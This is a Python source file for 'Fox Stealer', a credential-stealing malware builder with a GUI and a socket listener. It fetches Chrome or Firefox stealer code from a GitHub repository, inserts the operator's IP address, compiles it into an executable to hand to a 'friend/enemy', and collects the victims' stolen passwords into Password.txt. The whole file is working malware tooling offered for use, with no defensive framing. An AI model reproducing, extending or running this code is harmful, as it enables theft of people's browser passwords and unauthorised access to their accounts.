'''
Fox Stealer is Stealing program made by 19-9-13-16-6-5-25
'''
import customtkinter
import socket
import threading
import os
import sys
import requests
from colorama import Fore

customtkinter.set_appearance_mode("Dark")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("blue")  # Themes: "blue" (standard), "green", "dark-blue"
PORT = 9616
PUBLIC_IP = requests.get('https://api.ipify.org').content.decode('utf8')
HEADER = 1024
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = f"{Fore.LIGHTRED_EX}!DISCONNECT!{Fore.RESET}"
FOXSTEALER = f"{Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}"
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

class App(customtkinter.CTk):

    WIDTH = 780
    HEIGHT = 520

    def __init__(self):
        super().__init__()

        self.title("Fox Stealer")
        self.geometry(f"{App.WIDTH}x{App.HEIGHT}")
        self.protocol("WM_DELETE_WINDOW", self.on_closing)  # call .on_closing() when app gets closed

        # ============ create two frames ============

        # configure grid layout (2x1)
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.thread2 = threading.Thread(target=self.start)

        self.frame_left = customtkinter.CTkFrame(master=self,
                                                 width=180,
                                                 corner_radius=0)
        self.frame_left.grid(row=0, column=0, sticky="nswe")

        self.frame_right = customtkinter.CTkFrame(master=self)
        self.frame_right.grid(row=0, column=1, sticky="nswe", padx=20, pady=20)

        # ============ frame_left ============

        # configure grid layout (1x11)
        self.frame_left.grid_rowconfigure(0, minsize=10)   # empty row with minsize as spacing
        self.frame_left.grid_rowconfigure(5, weight=1)  # empty row as spacing
        self.frame_left.grid_rowconfigure(8, minsize=20)    # empty row with minsize as spacing
        self.frame_left.grid_rowconfigure(11, minsize=10)  # empty row with minsize as spacing

        self.label_1 = customtkinter.CTkLabel(master=self.frame_left,
                                              text="Fox Stealer",
                                              text_font=("Roboto Medium", -16))  # font name and size in px
        self.label_1.grid(row=1, column=0, pady=10, padx=10)

        self.button_1 = customtkinter.CTkButton(master=self.frame_left,
                                                text="Start Server",
                                                command=self.thread2.start)
        self.button_1.grid(row=2, column=0, pady=10, padx=20)

        self.button_2 = customtkinter.CTkButton(master=self.frame_left,
                                                text="Settings",
                                                command=self.button_event)
        self.button_2.grid(row=3, column=0, pady=10, padx=20)

        self.button_3 = customtkinter.CTkButton(master=self.frame_left,
                                                text="Exit",
                                                command=exit)

        self.button_3.grid(row=4, column=0, pady=10, padx=20)

        self.label_mode = customtkinter.CTkLabel(master=self.frame_left, text="Made By: Simpfey#0545")
        self.label_mode.grid(row=9, column=0, pady=0, padx=20, sticky="w")

        # ============ frame_right ============

        # configure grid layout (3x7)
        self.frame_right.rowconfigure((0, 1, 2, 3), weight=1)
        self.frame_right.rowconfigure(7, weight=10)
        self.frame_right.columnconfigure((0, 1), weight=1)
        self.frame_right.columnconfigure(2, weight=0)
        
        # ============ frame_right ============

        self.combobox_1 = customtkinter.CTkOptionMenu(master=self.frame_right,
                                                        values=["Chrome", "Firefox"],
                                                        #command=self.change_appearance_mode)
        )
        
        self.combobox_1.grid(row=0, column=2, columnspan=1, pady=10, padx=20, sticky="we")

        self.check_box_2 = customtkinter.CTkCheckBox(master=self.frame_right,
                                                     text="Compile Generated File")
        self.check_box_2.grid(row=0, column=0, pady=10, padx=20, sticky="w")

        self.check_box_3 = customtkinter.CTkCheckBox(master=self.frame_right,
                                                     text="Working Localy")
        self.check_box_3.grid(row=1, column=0, pady=10, padx=20, sticky="w")

        self.entry = customtkinter.CTkEntry(master=self.frame_right,
                                            width=120,
                                            placeholder_text="Name")
        self.entry.grid(row=8, column=0, columnspan=2, pady=20, padx=20, sticky="we")

        self.button_5 = customtkinter.CTkButton(master=self.frame_right,
                                                text="Generate File",
                                                border_width=2,  # <- custom border_width
                                                fg_color=None,  # <- no fg_color
                                                command=self.generate_file)
        self.button_5.grid(row=8, column=2, columnspan=1, pady=20, padx=20, sticky="we")

        # set default values
        self.combobox_1.set("Chrome")
        #self.slider_1.set(0.2)
        self.check_box_2.select()

    def generate_file(self):
        browser = self.combobox_1.get()
        compile = self.check_box_2.get()
        local = self.check_box_3.get()
        text = self.entry.get()
        if text != "":
            name = text
        else:
            name = "Victim"
        with open(f"{name}.py",'w',encoding = 'utf-8') as f:
            part1 = requests.get(f"https://raw.githubusercontent.com/Simpfey/FoxStealerSecrets/main/{browser}1.txt").content.decode("utf-8")
            part2 = requests.get(f"https://raw.githubusercontent.com/Simpfey/FoxStealerSecrets/main/{browser}2.txt").content.decode("utf-8")
            if not local:
                content = f'{part1}\nSERVER = "{PUBLIC_IP}"\n{part2}'
            else:
                content = f'{part1}\nSERVER = "{SERVER}"\n{part2}'
            f.write(content)
        command = f"pyinstaller --onefile {name}.py"

        if compile:
            compiler = threading.Thread(target=os.system, args=(command,))
            compiler.start()
            compiler2 = threading.Thread(target=os.system, args=(f"del {name}.py"))
            compiler2.start()
            compiler3 = threading.Thread(target=os.system, args=(f"del {name}.spec"))
            compiler3.start()

    def button_event(self):
        print("Already In Settings!")
    
    def handle_client(self, conn, addr, saveastxt):
        print(f"[{Fore.CYAN}SERVER{Fore.RESET}] {addr[0]} connected.")

        connected = True
        while connected:
            msg_length = conn.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length)
                msg = conn.recv(msg_length).decode(FORMAT)
                if msg == DISCONNECT_MESSAGE:
                    connected = False
                if saveastxt:
                    with open("Password.txt",'a+',encoding = 'utf-8') as f:
                        f.write(f'[{addr[0]}]: {msg}\n')
                if not saveastxt:
                    print(f"[{Fore.CYAN}{addr[0]}{Fore.RESET}] {msg}")
        if saveastxt:
            print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Stole {addr[0]} Data")
        conn.close()


    def start(self):
        self.button_1.configure(state="disabled", text="Start Server")
        saveastxt = 1
        compile = self.check_box_2.get()
        server.listen()
        os.system("cls")
        print(f"{FOXSTEALER}")
        print("")
        if not saveastxt:
            print(f"[{Fore.CYAN}WARNING{Fore.RESET}] {Fore.YELLOW}!Disabled Saving Passwords As TxT!{Fore.RESET}")
        print(f"[{Fore.CYAN}SERVER{Fore.RESET}] Server Started!")
        if compile:
            print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Give your friend/enemy .exe file from dist folder in {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}Directory")
        else:
            print(f"[{Fore.CYAN}CLIENT{Fore.RESET}] Give your friend/enemy .py file Its Located In {Fore.LIGHTRED_EX}Fox {Fore.LIGHTBLACK_EX}Stealer {Fore.RESET}Directory")
        print(f'''[{Fore.CYAN}LISTENER{Fore.RESET}] Server Info:
LOCAL IP: {Fore.LIGHTGREEN_EX}{SERVER}{Fore.RESET}
PUBLIC IP: {Fore.LIGHTGREEN_EX}{PUBLIC_IP}{Fore.RESET}
PORT: {Fore.LIGHTGREEN_EX}{PORT}{Fore.RESET}
    ''')
        print("")
        while True:
            conn, addr = server.accept()
            self.thread = threading.Thread(target=self.handle_client, args=(conn, addr, saveastxt))
            self.thread.start()
            self.ActiveCount = threading.active_count()
            print(f"[{Fore.CYAN}ACTIVE USERS{Fore.RESET}] {Fore.LIGHTGREEN_EX}{self.ActiveCount - 1}{Fore.RESET}")

    def on_closing(self, event=0):
        self.destroy()
        sys.exit()

if __name__ == "__main__":
    app = App()
    app.resizable(False,False)
    app.mainloop()